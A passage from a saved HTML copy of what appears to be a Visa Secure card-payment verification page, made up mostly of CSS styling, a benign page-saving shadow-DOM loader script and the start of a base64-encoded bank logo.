                    padding: 0 15px 0 0;
                }
            }
            a.closeModal:visited,
            .btn-link:visited {
                color: #000;
            }
            .visa-header-img {
                height: 100%;
            }
            .visa-header-one {
                margin-top: 10px;
                height: 30px;
            }
            .visa-header-two {
                margin-top: 10px;
                height: 30px;
            }
            @media screen and (min-width: 750px) {
                .visa-header-two {
                    padding-right: 0.5%;
                }
            }
            .visa-col-12.show-more {
                margin-left: 6%;
            }
            @media screen and (max-width: 251px) {
                .visa-col-12.show-more {
                    margin-bottom: 10px;
                }
            }
            #ErrorMessage {
                margin-left: 22.5%;
            }
            .visa-styling {
                font-family: segoe ui, Tahoma, sans-serif;
                font-size: 14px;
            }
            .visa-styling .container {
                padding: 0;
            }
            .visa-styling .col-12 {
                margin-bottom: 20px;
                padding: 0;
            }
            .visa-styling .text-align-left {
                text-align: left;
                margin-left: 6%;
                width: 94%;
            }
            .visa-styling .col-12.text-align-left {
                margin-bottom: 0;
            }
            .visa-styling .text-block-1 {
                margin-bottom: 20px;
            }
            .visa-styling #HeaderLogos > .row {
                padding-bottom: 3px;
                border-bottom: 1px solid #8180a3;
            }
            .visa-styling input,
            .visa-styling button {
                border-radius: 3px !important;
            }
            .visa-styling div:focus-within > label[for="CredentialValidateInput"] {
                color: #193ab0;
            }
            .visa-styling label[for="CredentialValidateInput"] {
                color: #8180a3;
                font-weight: 400;
            }
            .visa-styling label[for="CredentialValidateInput"].kba-input-label {
                width: 100%;
                font-weight: 700 !important;
                color: #000 !important;
                overflow-wrap: normal !important;
            }
            .visa-styling #CredentialValidateInput {
                text-align: center;
                border-color: #8180a3;
                font-size: 32px;
                line-height: 37px;
                height: 40px;
            }
            .visa-styling #CredentialValidateInput:focus {
                border-color: #193ab0 !important;
                box-shadow: none;
            }
            .visa-styling #CredentialValidateInput.kba {
                width: 100%;
                min-width: 225px;
                text-align: left;
                font-size: 15px;
                margin-bottom: 5px;
                box-sizing: border-box;
            }
            .visa-styling #CredentialValidateInput.kba::placeholder {
                color: #777;
                font-size: 12px;
            }
            .visa-styling .btn-primary {
                background: #193ab0;
            }
            .visa-styling .btn-primary:hover,
            .visa-styling .btn-primary:focus {
                background: #193ab0;
            }
            .visa-styling #ValidateButton {
                font-weight: 200;
                width: 100%;
                margin-bottom: 10px;
            }
            .visa-styling #KBAAction {
                width: 60%;
                margin: 0 auto;
            }
            .visa-styling #InputAction {
                width: 60%;
                margin: 0 auto;
            }
            .visa-styling #ValidateButton.kba-button {
                width: 225px;
                min-width: 225px;
                font-weight: 400;
            }
            .visa-styling #ContinueButton {
                font-weight: 200;
                margin-bottom: 15px;
                width: 55%;
                max-width: 300px;
            }
            .visa-styling .btn-link {
                color: #193ab0 !important;
            }
            .visa-styling .btn-link:hover,
            .visa-styling .btn-link:focus {
                color: #193ab0;
            }
            .visa-styling label[for="ConsumerRequestingWhiteList"] {
                display: inline;
                font-weight: 600;
                margin-left: 5%;
                font-size: 14px;
            }
            .visa-styling a:visited,
            .visa-styling .btn-link:visited {
                color: #193ab0;
            }
            .visa-styling .bottom-border.col-12 {
                border-bottom: 1px solid #a0a0a0;
                padding: 0;
                margin-bottom: 15px;
                padding-bottom: 15px;
            }
            .visa-styling .sticky-footer {
                max-width: 89%;
            }
            .visa-styling .body {
                max-width: 89%;
                padding: 0 10 10;
            }
            .visa-h3 {
                margin-bottom: 10px;
                margin-top: 0;
            }
            @media screen and (max-width: 251px) {
                .visa-h3 {
                    font-size: 21px;
                }
            }
            .visa-body {
                line-height: 19px;
            }
            .visa-body-2 {
                line-height: 19px;
                margin-bottom: 7.5px;
            }
            @media screen and (max-width: 251px) {
                .visa-body-2 {
                    margin-bottom: 10px;
                }
            }
            .closed {
                display: none;
            }
            .accordion {
                text-align: left;
                width: 100%;
            }
            .accordion.btn.btn-link.no-decoration::after {
                content: "";
                position: relative;
                top: 1px;
                display: inline-block;
                font-family: glyphicons halflings;
                font-style: normal;
                font-weight: 400;
                font-size: 20px;
                line-height: 14px;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                float: right;
                transition: transform 0.4s linear;
                -webkit-transition: -webkit-transform 0.4s linear;
            }
            .accordion.btn.btn-link.no-decoration {
                font-weight: 500;
            }
            .accordion.btn.btn-link.no-decoration:hover {
                background-color: #eee;
            }
            .accordion.btn.btn-link.no-decoration[aria-expanded="true"]:after {
                content: "−";
                -webkit-transform: rotate(180deg);
                transform: rotate(180deg);
            }
            .accordion.btn.btn-link.no-decoration[aria-expanded="false"]:after {
                content: "+";
                -webkit-transform: rotate(90deg);
                transform: rotate(90deg);
            }
            .helpRow {
                cursor: pointer;
            }
            .expandDiv {
                color: #000;
                text-align: left;
            }
            .visa-col-12.visa-validate {
                margin-bottom: 10px;
            }
            .visa-col-6-cred,
            .visa-col-6 {
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            .visa-col-6 {
                width: 50%;
            }
            .visa-col-6-cred {
                font-weight: 400;
            }
            .visa-row {
                padding: 0 0 0 1.2%;
            }
            .visa-row.kba {
                padding: 0 0 0 2.4%;
            }
            .ref-code-label {
                font-size: 1em;
                margin-bottom: 5px;
            }
            .ref-code {
                margin-bottom: 10px;
                margin-top: 0;
                color: #000;
            }
            body {
                font-size: 1.25em;
            }
            @media screen and (min-width: 251px) {
                .row {
                    padding: 1.2%;
                }
            }
            @media screen and (max-width: 390px) {
                .threeds-two {
                    max-width: 98%;
                }
            }
            .rtl {
                direction: rtl;
            }
            .threeds-one .container,
            .threeds-one .header,
            .threeds-one .body,
            .threeds-one .footer,
            .threeds-one .sticky-footer,
            .threeds-one .modal-dialog {
                max-width: 400px;
                margin: 0 auto;
            }
            .threeds-two .container,
            .threeds-two .header,
            .threeds-two .body,
            .threeds-two .footer,
            .threeds-two .sticky-footer,
            .threeds-two .modal-dialog,
            .threeds-two .header.visa-styling {
                max-width: 600px;
                margin: 0 auto;
            }
            .container {
                margin: 0 auto;
                padding: 0.75em 0 0;
            }
            .header,
            .footer,
            .sticky-footer,
            .modal-dialog {
                margin: 0 auto;
            }
            .header {
                height: 70px;
            }
            .footer .row {
                padding-bottom: 0;
            }
            .row.no-pad {
                padding: 0;
            }
            #CardNumber,
            .always-left-to-right {
                unicode-bidi: embed;
                direction: ltr;
            }
            span.field-validation-error {
                color: #d70000;
            }
            .field-validation-valid {
                display: none;
            }
            .header-logo {
                max-height: 70px;
                max-width: 40%;
            }
            .header-logo-visa {
                height: 50%;
                max-width: 50%;
            }
            @-moz-document url-prefix() {
                .header-logo-visa {
                    height: 50%;
                    max-height: 50px;
                    width: 50%;
                    max-width: 100px;
                }
            }
            .h1,
            h1 {
                font-size: 1.25em;
            }
            iframe.hidden {
                border: none;
                height: 1px;
                width: 1px;
            }
            .hidden,
            .risk-provider-container {
                position: absolute;
                width: 1px;
                height: 1px;
                margin: -1px;
                padding: 0;
                overflow: hidden;
                clip: rect(0, 0, 0, 0);
                border: 0;
            }
            .hidden-iframe {
                border: none;
                height: 1px;
                width: 1px;
            }
            .processing .processing-img {
                height: auto;
                width: auto;
                max-width: 85px;
                padding-top: 45px;
            }
            .processing .processing-text {
                color: #000;
                font-weight: 600;
                font-size: 1em;
                text-align: center;
            }
            .list-inline-separated li {
                margin-left: -10px;
            }
            .list-inline-separated li:first-child {
                margin-left: 0;
            }
            .list-inline-separated li:after {
                content: "|";
                margin: 0 5px;
            }
            .list-inline-separated li:last-child:after {
                content: "";
            }
            .form-two-col .form-group-sm > label,
            .form-two-col .form-group-sm > span {
                width: 50%;
                float: left;
                margin: 0;
            }
            .form-two-col .form-group-sm > label {
                text-align: left;
            }
            .form-two-col .form-group-sm > span {
                text-align: left;
            }
            ul.list-grouped {
                margin: 0;
            }
            ul.list-grouped li.row {
                border-top: 1px solid #999;
                padding: 2px 0;
            }
            ul.list-grouped li.row {
                border-top: 1px solid;
                padding: 2px 0;
            }
            ul.list-grouped li:first-child {
                border: none;
            }
            ul.list-grouped [class*=" col-"],
            ul.list-grouped [class^="col-"] {
                padding-left: 0;
            }
            ul.list-grouped label {
                margin: 0;
            }
            ul.list-grouped-visa {
                margin: 0;
                font-size: 14px;
            }
            ul.list-grouped-visa li.row {
                border-top: 1px;
                padding: 10px 0;
            }
            ul.list-grouped-visa li:first-child {
                border: none;
            }
            ul.list-grouped-visa [class*=" col-"],
            ul.list-grouped-visa [class^="col-"] {
                padding-left: 0;
            }
            ul.list-grouped-visa label {
                margin: 0;
            }
            ul.list-segmented {
                list-style: none;
                padding: 0;
                margin: 0;
            }
            ul.list-segmented li {
                margin-bottom: 3px;
            }
            ul.list-segmented label {
                position: initial !important;
            }
            .accordion.modal .modal-body {
                padding: 0;
            }
            .accordion.modal .modal-body .panel-group {
                margin: 0;
            }
            .accordion.modal .modal-body .panel-group .panel {
                background: #f5f5f5;
                border-bottom: 1px solid #ccc;
            }
            .accordion.modal .modal-body .panel-group .panel-body {
                padding: 4px 8px;
                background: #fff;
            }
            .accordion.modal .modal-body .panel-group a {
                display: block;
                padding: 8px;
                color: inherit;
                font-size: 1em;
                text-decoration: none;
            }
            .accordion.modal .modal-body .panel-group a .expander span:before {
                content: "-";
            }
            .accordion.modal .modal-body .panel-group a.collapsed .expander span:before {
                content: "+";
            }
            .accordion.modal .modal-body .panel-group .expander {
                float: left;
                width: 12px;
                font-weight: 700;
                text-align: center;
            }
            .accordion.modal .modal-body .panel-group .content {
                margin-left: 20px;
            }
            .partial-modal {
                height: 320px;
                overflow-y: auto;
            }
            h4.pad-right {
                padding-right: 4px;
            }
            .list-segmented h4 {
                padding-left: 8px;
            }
            #ChoiceOptInMessage {
                padding-bottom: 5px;
            }
            form {
                margin-bottom: 0;
            }
            #whyInfoMessage {
                color: #717171;
                background: #f3f3f3;
                padding: 10px;
                border-radius: 5px;
                word-wrap: break-word;
            }
            #whyInfoLabel {
                border-bottom: 1px solid #dedede;
            }
            .oob-validate-link {
                background: 0 0 !important;
                border: none;
                padding: 0 !important;
                color: #069;
                text-decoration: underline;
                cursor: pointer;
            }
            .oob-validate-label {
                display: block;
                margin-top: 15px;
                font-weight: 400;
            }
            .oob-validate-error {
                color: #d70000;
                font-weight: 400;
                font-size: 12px;
            }
            .frame-container {
                position: fixed;
                top: 20px;
                bottom: 0;
                left: 0;
                right: 0;
            }
            .third-party-frame {
                width: 100%;
                height: 100%;
                border: none;
            }
            .col-12.explicit-consent {
                padding: 0;
                border: 1px solid #ddd;
                right: 60px;
                height: 80px;
                overflow-y: scroll;
                margin: 0 0 0 22px;
                background-color: #aaa;
            }
            @media screen and (max-height: 420px) {
                .container-sticky-footer {
                    padding: 0;
                }
                .container-sticky-footer .header,
                .container-sticky-footer .body,
                .container-sticky-footer .sticky-footer {
                    position: absolute;
                    width: 100%;
                }
                .container-sticky-footer .sticky-footer {
                    margin: 0 auto;
                }
                .container-sticky-footer .header {
                    top: 5px;
                }
                .container-sticky-footer .body {
                    top: 65px;
                    overflow-y: auto;
                    padding-bottom: 5px;
                }
                .container-sticky-footer .body .row:last-child {
                    padding-bottom: 0;
                }
                .container-sticky-footer .sticky-footer {
                    bottom: 0;
                    background: #fff;
                }
                .container-sticky-footer .sticky-footer a.btn.btn-link {
                    padding: 0;
                }
            }
            .modal-clear .modal-dialog {
                margin: 100px auto;
            }
            .modal-clear .modal-content {
                background: 0 0;
                border: none;
            }
            :not(.lt-ie9) label.custom-radio {
                cursor: pointer;
                padding: 0 0 0 30px;
                display: inline-block;
            }
            :not(.lt-ie9) [name="CredentialId"][type="radio"] {
                border: 0;
                position: absolute;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                width: 1px;
            }
            :not(.lt-ie9) [name="CredentialId"][type="radio"] ~ label:before {
                content: "";
                display: inline-block;
                width: 12px;
                height: 12px;
                margin: 0 -20px;
                vertical-align: -1px;
                border: 2px solid #fff;
                border-radius: 6px;
                box-shadow: 0 0 0 1px #777;
                -moz-transition: 0.1s ease all;
                -o-transition: 0.1s ease all;
                -webkit-transition: 0.1s ease all;
                transition: 0.1s ease all;
                position: absolute;
            }
            :not(.lt-ie9) [name="CredentialId"][type="radio"]:checked ~ label:before {
                background: #777;
            }
            :not(.lt-ie9) [name="CredentialId"][type="radio"]:focus ~ label:before {
                box-shadow: 0 0 2px 2px #777;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div,
            :not(.lt-ie9) .screenreader-only-rtl + ul {
                padding-right: 16px !important;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div label.custom-radio,
            :not(.lt-ie9) .screenreader-only-rtl + ul label.custom-radio {
                padding: 0 24px 0 0;
                display: block;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div [name="CredentialId"][type="radio"] ~ label:before,
            :not(.lt-ie9) .screenreader-only-rtl + ul [name="CredentialId"][type="radio"] ~ label:before {
                margin: 0 -40px 0 0;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div .list-segmented [name="CredentialId"][type="radio"] ~ label:before {
                margin: 0 -40px 0 0;
            }
            :not(.lt-ie9) .screenreader-only-rtl ~ div #ShowMoreLink {
                padding-right: 30px;
            }
            :not(.lt-ie9) [name="CardholderId"][type="radio"] {
                border: 0;
                position: absolute;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                width: 1px;
            }
            :not(.lt-ie9) [name="CardholderId"][type="radio"] ~ label:before {
                content: "";
                display: inline-block;
                width: 12px;
                height: 12px;
                margin: 0 -20px;
                vertical-align: -1px;
                border: 2px solid #fff;
                border-radius: 6px;
                box-shadow: 0 0 0 1px #777;
                -moz-transition: 0.1s ease all;
                -o-transition: 0.1s ease all;
                -webkit-transition: 0.1s ease all;
                transition: 0.1s ease all;
                position: absolute;
            }
            :not(.lt-ie9) [name="CardholderId"][type="radio"]:checked ~ label:before {
                background: #777;
            }
            :not(.lt-ie9) [name="CardholderId"][type="radio"]:focus ~ label:before {
                box-shadow: 0 0 2px 2px #777;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div,
            :not(.lt-ie9) .screenreader-only-rtl + ul {
                padding-right: 16px !important;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div label.custom-radio,
            :not(.lt-ie9) .screenreader-only-rtl + ul label.custom-radio {
                padding: 0 24px 0 0;
                display: block;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div [name="CardholderId"][type="radio"] ~ label:before,
            :not(.lt-ie9) .screenreader-only-rtl + ul [name="CardholderId"][type="radio"] ~ label:before {
                margin: 0 -40px 0 0;
            }
            :not(.lt-ie9) .screenreader-only-rtl + div .list-segmented [name="CardholderId"][type="radio"] ~ label:before {
                margin: 0 -40px 0 0;
            }
            :not(.lt-ie9) .visa-styling [name="CredentialId"][type="radio"] ~ label:before {
                width: 20px;
                height: 20px;
                border-radius: 10px;
                box-shadow: 0 0 0 2px #193ab0;
                font-size: 14px;
                margin: 0 -30px;
            }
            @media screen and (max-width: 251px) {
                :not(.lt-ie9) .visa-styling [name="CredentialId"][type="radio"] ~ label:before {
                    width: 15px;
                    height: 15px;
                    border-radius: 7.5px;
                    margin: 2px -25px;
                }
            }
            :not(.lt-ie9) .visa-styling [name="CredentialId"][type="radio"]:hover ~ label:before {
                background: #d3d3d3;
            }
            :not(.lt-ie9) .visa-styling [name="CredentialId"][type="radio"]:focus ~ label:before {
                box-shadow: 0 0 2px 2px #1c96fd;
            }
            :not(.lt-ie9) .visa-styling [name="CredentialId"][type="radio"]:checked ~ label:before {
                background: #193ab0;
            }
            label.custom-checkbox {
                cursor: pointer;
                padding: 0 0 0 30px;
                display: inline-block;
            }
            [type="checkbox"] {
                border: 0;
                position: absolute;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                width: 1px;
            }
            [type="checkbox"] ~ label {
                cursor: pointer;
                background: #ebebeb;
            }
            [type="checkbox"] ~ label:before {
                content: "";
                cursor: pointer;
                display: inline-block;
                width: 19px;
                height: 19px;
                margin: 0 -23px;
                vertical-align: -1px;
                -moz-transition: 0.1s ease all;
                -o-transition: 0.1s ease all;
                -webkit-transition: 0.1s ease all;
                transition: 0.1s ease all;
                position: absolute;
                content: "";
                border: 1px solid #193ab0;
            }
            [type="checkbox"]:checked ~ label:before {
                content: "✔";
                cursor: pointer;
                color: #fff;
                background: #193ab0;
            }
            [type="checkbox"]:hover ~ label:before {
                background: #d3d3d3;
            }
            [type="checkbox"]:checked:hover ~ label:before {
                content: "✔";
                cursor: pointer;
                background: #193ab0;
                color: #fff;
            }
            [type="checkbox"]:focus ~ label:before {
                box-shadow: 0 0 1px 1px #add8e6;
            }
            @supports (-ms-ime-align: auto) {
                [type="checkbox"] ~ label:before {
                    content: "";
                    cursor: pointer;
                    display: inline-block;
                    width: 14px;
                    height: 14px;
                    margin: 0 -18px;
                    vertical-align: -1px;
                    border: 2px solid #fff;
                    border-radius: 5px;
                    box-shadow: 0 0 0 2px #193ab0;
                    -moz-transition: 0.1s ease all;
                    -o-transition: 0.1s ease all;
                    -webkit-transition: 0.1s ease all;
                    transition: 0.1s ease all;
                    position: absolute;
                }
                [type="checkbox"]:checked ~ label:before {
                    content: "✓";
                    cursor: pointer;
                    line-height: 14px;
                }
            }
            #linkContainer {
                position: relative;
            }
            #linkMask {
                background: rgba(255, 255, 255, 0.8);
                position: absolute;
                left: 0;
            }
            #blockMask {
                position: absolute;
                left: 0;
            }
        </style>

        <style>
            body {
                color: #000000;
                font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
                font-size: 1.25em;
            }
            .header,
            legend,
            h1,
            h2,
            h3,
            h4 {
                color: #000000;
            }
            label {
                color: #000000;
            }
            a,
            .btn-link {
                color: #000000;
                text-decoration: underline;
            }
            a:visited,
            .btn-link:visited {
                color: #000000;
            }
            a:hover,
            a:focus,
            .btn-link:hover,
            .btn-link:focus {
                color: #211f1f;
            }
            a:active,
            .btn-link:active {
                color: #211f1f;
            }
            a.btn-link {
                font-size: 0.95em;
            }
            .btn-primary,
            .btn-primary:focus,
            .btn-primary:hover {
                background: #211f1f;
                color: #fff;
                border: none;
                border-radius: 0;
            }
            .btn-primary:active,
            .btn-primary:active:hover,
            .btn-primary:active:focus {
                background: #ab2c29;
            }
            fieldset {
                border: 0;
            }
            fieldset > legend {
                border-bottom: 0;
                font-size: 1em;
            }
            :not(.lt-ie9) label.custom-radio [type="radio"]:checked + span:before {
                background: #211f1f;
            }
            .accordion.modal .modal-body .panel-group .expander {
                color: #211f1f;
            }
            .accordion.modal .modal-body .panel-group .panel {
                background: #fff;
            }
            .field-validation-error {
                color: #ab2c29;
            }
            .toast-top-full-width {
                display: none;
            }
        </style>

        <style id="savepage-cssvariables">
            :root {
            }
        </style>
        <script id="savepage-shadowloader" type="text/javascript">
            "use strict";
            window.addEventListener(
                "DOMContentLoaded",
                function (event) {
                    savepage_ShadowLoader(5);
                },
                false
            );
            function savepage_ShadowLoader(c) {
                createShadowDOMs(0, document.documentElement);
                function createShadowDOMs(a, b) {
                    var i;
                    if (b.localName == "iframe" || b.localName == "frame") {
                        if (a < c) {
                            try {
                                if (b.contentDocument.documentElement != null) {
                                    createShadowDOMs(a + 1, b.contentDocument.documentElement);
                                }
                            } catch (e) {}
                        }
                    } else {
                        if (b.children.length >= 1 && b.children[0].localName == "template" && b.children[0].hasAttribute("data-savepage-shadowroot")) {
                            b.attachShadow({ mode: "open" }).appendChild(b.children[0].content);
                            b.removeChild(b.children[0]);
                            for (i = 0; i < b.shadowRoot.children.length; i++) if (b.shadowRoot.children[i] != null) createShadowDOMs(a, b.shadowRoot.children[i]);
                        }
                        for (i = 0; i < b.children.length; i++) if (b.children[i] != null) createShadowDOMs(a, b.children[i]);
                    }
                }
            }
        </script>
    </head>
    <body>
        <div class="threeds-two">
            <div class="container-fluid">
                <div class="visa-styling header" id="HeaderLogosFullWidth">
                    <a href="#" class="closeModal" id="ExitLink">X</a>
                    <div class="row no-pad">
                        <div class="visa-styling bottom-border col-12">
                            <div class="pull-left visa-header-one">
                                <img
                                    alt="Bank Logo"
                                    class="visa-header-img"
                                    src="data:image/png;base64,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